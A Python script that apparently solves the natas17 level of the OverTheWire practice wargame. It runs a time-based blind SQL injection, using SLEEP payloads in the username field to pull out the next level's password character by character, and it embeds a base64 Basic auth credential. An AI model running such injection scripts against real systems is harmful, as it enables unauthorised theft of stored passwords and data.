#! /usr/bin/python3

import string
import sys
import time
import urllib.parse
import urllib.request


def main():
    chars = list(string.ascii_letters) + list(string.digits)

    url = 'http://natas17.natas.labs.overthewire.org/'
    headers = {
            'Authorization': 'Basic bmF0YXMxNzpFcWpISmJvN0xGTmI4dndoSGI5czc1aG9raDVURjBPQw=='
    }

    passwd = ''

    for i in range(32):
        print(f'Guessing at index {i + 1}')
        for c in chars:
            #condition  =  'natas18" AND SUBSTR(password,{i+1},1) = BINARY "{c}" AND SLEEP(5)-- '
            condition  =  f'natas18" AND password LIKE BINARY "{passwd + c}%" AND SLEEP(5)-- '

            data = 'username=' + urllib.parse.quote(condition)
            data = data.encode()

            req = urllib.request.Request(
                url + '?debug=',
                headers=headers, data=data)

            start_time = time.time()
            resp = urllib.request.urlopen(req)
            end_time = time.time()

            if resp.status != 200:
                print('Received an unexpected error')
                sys.exit(1)
            else:
                time_difference = end_time - start_time
                if time_difference > 2:
                    passwd += c
                    print(f'found password at position {i + 1}: {passwd}')
                    break

    print(f'password is {passwd}')

if __name__ == "__main__":
    main()
